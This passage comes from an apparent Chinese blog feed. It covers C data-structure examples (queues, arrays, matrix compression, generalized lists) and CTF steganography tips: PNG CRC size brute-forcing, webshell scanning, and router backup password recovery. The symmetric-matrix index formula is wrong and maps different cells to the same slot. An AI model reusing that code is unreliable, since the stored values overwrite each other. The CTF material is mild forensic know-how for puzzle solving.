<span class="hljs-number">40</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enqueued: 40\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个示例中，<code>enqueue</code>函数将元素添加到循环队列的队尾，而<code>dequeue</code>函数从队头移除元素并返回。通过<code>(queue-&gt;front + 1) % MAX_SIZE</code>和<code>(queue-&gt;rear + 1) % MAX_SIZE</code>的计算，使得指针在到达数组末端时能够回绕到数组的开始位置，从而实现循环队列的功能。</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组是具有相同类型元素的集合，元素在内存中按顺序存储。根据数组维度的不同，数组可以分为一维数组、二维数组和三维数组。</p><h4 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h4><p>一维数组是一组具有相同类型的变量。数组中的每个元素都有一个索引，索引从0开始。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> arr[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br></code></pre></td></tr></table></figure><p>可以通过索引访问和修改数组中的元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">arr[<span class="hljs-number">2</span>] = <span class="hljs-number">10</span>; <span class="hljs-comment">// 修改第三个元素的值为10</span><br></code></pre></td></tr></table></figure><h4 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h4><p>二维数组可以看作是数组的数组，通常用于表示矩阵或表格数据。声明一个二维数组的方法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> matrix[<span class="hljs-number">3</span>][<span class="hljs-number">3</span>] = &#123;<br>    &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;,<br>    &#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;,<br>    &#123;<span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>访问二维数组元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> value = matrix[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]; <span class="hljs-comment">// 获取第二行第三列的元素</span><br></code></pre></td></tr></table></figure><h4 id="三维数组"><a href="#三维数组" class="headerlink" title="三维数组"></a>三维数组</h4><p>三维数组是数组的进一步扩展，通常用于表示多维空间中的数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> array3D[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>][<span class="hljs-number">4</span>] = &#123;<br>    &#123;<br>        &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;,<br>        &#123;<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>&#125;,<br>        &#123;<span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>&#125;<br>    &#125;,<br>    &#123;<br>        &#123;<span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>&#125;,<br>        &#123;<span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>&#125;,<br>        &#123;<span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>&#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>访问三维数组元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> value = array3D[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]; <span class="hljs-comment">// 获取第二个2D数组的第三行第四列的元素</span><br></code></pre></td></tr></table></figure><h3 id="矩阵的压缩存储"><a href="#矩阵的压缩存储" class="headerlink" title="矩阵的压缩存储"></a>矩阵的压缩存储</h3><p>矩阵压缩存储用于节省空间，特别是在矩阵具有某种特殊结构时，例如对称矩阵、三角矩阵和稀疏矩阵。</p><h4 id="对称矩阵"><a href="#对称矩阵" class="headerlink" title="对称矩阵"></a>对称矩阵</h4><p>对称矩阵是指矩阵的元素满足 <code>A[i][j] == A[j][i]</code>。对于对称矩阵，只需要存储矩阵的上三角或下三角部分即可。</p><p>假设存储上三角部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> n = <span class="hljs-number">3</span>; <span class="hljs-comment">// 矩阵的维度</span><br><span class="hljs-type">int</span> symmetricMatrix[(n * (n + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span>]; <span class="hljs-comment">// 存储上三角部分的数组</span><br><br><span class="hljs-comment">// 计算索引</span><br><span class="hljs-type">int</span> index = (i * (i + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + j;<br>symmetricMatrix[index] = value;<br></code></pre></td></tr></table></figure><p>访问元素时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">getSymmetricMatrixValue</span><span class="hljs-params">(<span class="hljs-type">int</span>* mat, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i &lt;= j) &#123;<br>        <span class="hljs-keyword">return</span> mat[(i * (i + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + j];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> mat[(j * (j + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + i];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="三角矩阵"><a href="#三角矩阵" class="headerlink" title="三角矩阵"></a>三角矩阵</h4><ul><li><strong>上三角矩阵</strong>：只存储非零的上三角部分。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> upperTriangular[(n * (n + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span>];<br></code></pre></td></tr></table></figure><p>存储上三角矩阵的元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (i &lt;= j) &#123;<br>    upperTriangular[(i * n) - (i * (i - <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + (j - i)] = value;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>下三角矩阵</strong>：只存储非零的下三角部分。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> lowerTriangular[(n * (n + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span>];<br></code></pre></td></tr></table></figure><p>存储下三角矩阵的元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (i &gt;= j) &#123;<br>    lowerTriangular[(i * (i + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + j] = value;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="稀疏矩阵压缩存储"><a href="#稀疏矩阵压缩存储" class="headerlink" title="稀疏矩阵压缩存储"></a>稀疏矩阵压缩存储</h4><p>稀疏矩阵是指大部分元素为零的矩阵。稀疏矩阵可以通过三元组（行、列、值）来压缩存储。常见的存储方法包括COO（Coordinate List）、CSR（Compressed Sparse Row）和CSC（Compressed Sparse Column）。</p><ul><li><strong>COO（Coordinate List）</strong>：使用三个数组分别存储非零元素的行索引、列索引和对应的值。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> row[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br><span class="hljs-type">int</span> col[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">int</span> val[] = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>CSR（Compressed Sparse Row）</strong>：使用三个数组存储稀疏矩阵，分别是 <code>values</code>（非零元素的值），<code>col_index</code>（非零元素所在的列索引）和 <code>row_pointer</code>（每行开始的位置）。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> values[] = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>&#125;;<br><span class="hljs-type">int</span> col_index[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">int</span> row_pointer[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>CSC（Compressed Sparse Column）</strong>：与CSR类似，使用三个数组存储稀疏矩阵，只不过是按列进行存储。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> values[] = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">30</span>, <span class="hljs-number">20</span>, <span class="hljs-number">40</span>&#125;;<br><span class="hljs-type">int</span> row_index[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>&#125;;<br><span class="hljs-type">int</span> col_pointer[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br></code></pre></td></tr></table></figure><p>这些压缩存储方法通过只存储非零元素和它们的位置，大大减少了稀疏矩阵所需的存储空间。</p><h3 id="广义表"><a href="#广义表" class="headerlink" title="广义表"></a>广义表</h3><p>广义表（Generalized List）是线性表的推广，广义表中的元素不仅可以是原子（不可再分的基本元素），还可以是子表（即一个广义表）。因此，广义表是一个递归结构，可以包含多个层次的子表。</p><h4 id="广义表的结构定义"><a href="#广义表的结构定义" class="headerlink" title="广义表的结构定义"></a>广义表的结构定义</h4><p>在C语言中，广义表通常通过链表来实现，每个节点可以是一个原子值或一个指向子表的指针。以下是广义表的基本结构定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span> ATOM, LIST &#125; ElemTag; <span class="hljs-comment">// 定义元素类型：ATOM表示原子，LIST表示子表</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">GLNode</span> &#123;</span><br>    ElemTag tag;  <span class="hljs-comment">// 节点类型</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-type">char</span> atom;  <span class="hljs-comment">// 当tag为ATOM时，存储原子值</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">GLNode</span>* <span class="hljs-title">head</span>;</span>  <span class="hljs-comment">// 指向子表头节点</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">GLNode</span>* <span class="hljs-title">tail</span>;</span>  <span class="hljs-comment">// 指向广义表的下一个节点</span><br>        &#125; ptr;<br>    &#125; value;<br>&#125; GLNode;<br><br><span class="hljs-comment">// 创建一个原子节点</span><br>GLNode* <span class="hljs-title function_">createAtomNode</span><span class="hljs-params">(<span class="hljs-type">char</span> atom)</span> &#123;<br>    GLNode* node = (GLNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(GLNode));<br>    node-&gt;tag = ATOM;<br>    node-&gt;value.atom = atom;<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-comment">// 创建一个子表节点</span><br>GLNode* <span class="hljs-title function_">createListNode</span><span class="hljs-params">(GLNode* head, GLNode* tail)</span> &#123;<br>    GLNode* node = (GLNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(GLNode));<br>    node-&gt;tag = LIST;<br>    node-&gt;value.ptr.head = head;<br>    node-&gt;value.ptr.tail = tail;<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="广义表的示例"><a href="#广义表的示例" class="headerlink" title="广义表的示例"></a>广义表的示例</h4><p>假设有一个广义表 <code>((a, b), c, (d, (e, f)))</code>，它可以通过以下方式构建：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 创建原子节点</span><br>    GLNode* a = createAtomNode(<span class="hljs-string">&#x27;a&#x27;</span>);<br>    GLNode* b = createAtomNode(<span class="hljs-string">&#x27;b&#x27;</span>);<br>    GLNode* c = createAtomNode(<span class="hljs-string">&#x27;c&#x27;</span>);<br>    GLNode* d = createAtomNode(<span class="hljs-string">&#x27;d&#x27;</span>);<br>    GLNode* e = createAtomNode(<span class="hljs-string">&#x27;e&#x27;</span>);<br>    GLNode* f = createAtomNode(<span class="hljs-string">&#x27;f&#x27;</span>);<br><br>    <span class="hljs-comment">// 创建子表 (e, f)</span><br>    GLNode* ef = createListNode(e, createListNode(f, <span class="hljs-literal">NULL</span>));<br><br>    <span class="hljs-comment">// 创建子表 (d, (e, f))</span><br>    GLNode* de = createListNode(d, createListNode(ef, <span class="hljs-literal">NULL</span>));<br><br>    <span class="hljs-comment">// 创建子表 (a, b)</span><br>    GLNode* ab = createListNode(a, createListNode(b, <span class="hljs-literal">NULL</span>));<br><br>    <span class="hljs-comment">// 创建广义表 ((a, b), c, (d, (e, f)))</span><br>    GLNode* gList = createListNode(ab, createListNode(c, createListNode(de, <span class="hljs-literal">NULL</span>)));<br><br>    <span class="hljs-comment">// 打印广义表（为了简洁，省略具体的打印实现）</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个例子中，广义表的结构是通过链表的嵌套来实现的。每个节点要么是一个原子值，要么是一个子表，子表可以进一步包含其他原子或子表。</p><h4 id="广义表的基本操作"><a href="#广义表的基本操作" class="headerlink" title="广义表的基本操作"></a>广义表的基本操作</h4><ol><li><p><strong>获取广义表的头部</strong>（即第一个元素）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">GLNode* <span class="hljs-title function_">getHead</span><span class="hljs-params">(GLNode* gList)</span> &#123;<br>    <span class="hljs-keyword">if</span> (gList &amp;&amp; gList-&gt;tag == LIST) &#123;<br>        <span class="hljs-keyword">return</span> gList-&gt;value.ptr.head;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>获取广义表的尾部</strong>（即去掉第一个元素后剩余的部分）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">GLNode* <span class="hljs-title function_">getTail</span><span class="hljs-params">(GLNode* gList)</span> &#123;<br>    <span class="hljs-keyword">if</span> (gList &amp;&amp; gList-&gt;tag == LIST) &#123;<br>        <span class="hljs-keyword">return</span> gList-&gt;value.ptr.tail;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>判断广义表是否为空表</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isEmpty</span><span class="hljs-params">(GLNode* gList)</span> &#123;<br>    <span class="hljs-keyword">return</span> gList == <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>计算广义表的长度</strong>（即顶层元素的个数）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">length</span><span class="hljs-params">(GLNode* gList)</span> &#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (gList) &#123;<br>        len++;<br>        gList = gList-&gt;value.ptr.tail;<br>    &#125;<br>    <span class="hljs-keyword">return</span> len;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>计算广义表的深度</strong>（即广义表的最大嵌套层数）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">depth</span><span class="hljs-params">(GLNode* gList)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!gList) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (gList-&gt;tag == ATOM) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> maxDepth = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (gList) &#123;<br>        <span class="hljs-type">int</span> currentDepth = depth(gList-&gt;value.ptr.head);<br>        <span class="hljs-keyword">if</span> (currentDepth &gt; maxDepth) &#123;<br>            maxDepth = currentDepth;<br>        &#125;<br>        gList = gList-&gt;value.ptr.tail;<br>    &#125;<br>    <span class="hljs-keyword">return</span> maxDepth + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="广义表的用途"><a href="#广义表的用途" class="headerlink" title="广义表的用途"></a>广义表的用途</h3><p>广义表可以表示任意复杂的递归结构，适用于需要表示层次结构、嵌套关系的数据结构，如编译器中的语法树、复合数据结构的解析等。它通过递归定义和操作，能够灵活地表示和处理多层嵌套的数据。</p>]]></content>
    
    
    <categories>
      
      <category>c语言的数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>c语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>隐写系列</title>
    <link href="/2024/09/01/%E9%9A%90%E5%86%99%E7%B3%BB%E5%88%97/"/>
    <url>/2024/09/01/%E9%9A%90%E5%86%99%E7%B3%BB%E5%88%97/</url>
    
    <content type="html"><![CDATA[<ol><li>有时候会遇见需要改宽高的情况，一般会根据图片的crc值爆破出正确的宽高。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br>CRC=<span class="hljs-number">0x6D7C7135</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;dabai.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    crcbp=f.read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>        data = crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + \<br>            struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span>(crc32 == CRC):<br>            <span class="hljs-built_in">print</span>(i, j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hex:&#x27;</span>, <span class="hljs-built_in">hex</span>(i), <span class="hljs-built_in">hex</span>(j))<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>也可以考虑下面这个脚本自动改宽高并生成文件(仅限png):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> struct<br>file = <span class="hljs-string">&#x27;/Users/constellation/Downloads/misc26.png&#x27;</span><br>fr = <span class="hljs-built_in">open</span>(file,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>data = <span class="hljs-built_in">bytearray</span>(fr[<span class="hljs-number">12</span>:<span class="hljs-number">29</span>])<br><span class="hljs-comment">#crc32key = str(fr[29:33]).replace(&#x27;\\x&#x27;,&#x27;&#x27;).replace(&quot;b&#x27;&quot;,&#x27;0x&#x27;).replace(&quot;&#x27;&quot;,&#x27;&#x27;)</span><br>crc32key = <span class="hljs-number">0xEC9CCBC6</span> <span class="hljs-comment">#补上0x，copy hex value</span><br><span class="hljs-comment">#data = bytearray(b&#x27;\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00&#x27;)  #hex下copy grep hex</span><br>n = <span class="hljs-number">4095</span> <span class="hljs-comment">#理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了</span><br><span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<span class="hljs-comment">#高和宽一起爆破</span><br>    width = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, w))<span class="hljs-comment">#q为8字节，i为4字节，h为2字节</span><br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        height = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, h))<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            data[x+<span class="hljs-number">4</span>] = width[x]<br>            data[x+<span class="hljs-number">8</span>] = height[x]<br>            <span class="hljs-comment">#print(data)</span><br>        crc32result = zlib.crc32(data)<br>        <span class="hljs-keyword">if</span> crc32result == crc32key:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;width:<span class="hljs-subst">&#123;width.<span class="hljs-built_in">hex</span>()&#125;</span>\nheight:<span class="hljs-subst">&#123;height.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>            newpic = <span class="hljs-built_in">bytearray</span>(fr)<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                newpic[x+<span class="hljs-number">16</span>] = width[x]<br>                newpic[x+<span class="hljs-number">20</span>] = height[x]<br>            fw = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;file&#125;</span>.png&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>            fw.write(newpic)<br>            fw.close()<br>            exit()<br></code></pre></td></tr></table></figure><ol start="5"><li>遇见webshell查杀题直接用D盾扫。例题:<a href="https://buuoj.cn/challenges#webshell%E5%90%8E%E9%97%A8">webshell后门</a></li><li>音频隐写题首先考虑audacity打开看波形图和频谱图。发现可疑的线索时多缩放。今天就看见了一道藏摩斯电码然而默认缩放比例下无法展示完全的题：<a href="https://buuoj.cn/challenges#%E6%9D%A5%E9%A6%96%E6%AD%8C%E5%90%A7">来首歌吧</a></li><li>从宽带备份文件出恢复账户名密码名等信息：使用工具<a href="https://www.nirsoft.net/utils/router_password_recovery.html">RouterPassView</a>。</li><li>vmdk后缀文件可以在linux下直接用7z解压。例题：<a href="https://blog.csdn.net/weixin_45485719/article/details/107417878">面具下的flag</a></li><li>隐写工具：</li></ol><ul><li>zsteg</li></ul><blockquote><p>zsteg xxx.png(仅图片)<br>如果zsteg输出类似这样的东西：</p></blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">extradata:<span class="hljs-number">0</span>         .. file: Zip archive data, at least v2<span class="hljs-number">.0</span> <span class="hljs-keyword">to</span> extract, compression <span class="hljs-keyword">method</span>=AES <span class="hljs-keyword">Encrypted</span><br></code></pre></td></tr></table></figure><p>说明这里有文件可以提取。记住开始的字符串，使用以下命令提取：</p><ul><li>zsteg -E “extradata:0” ctf.png &gt; 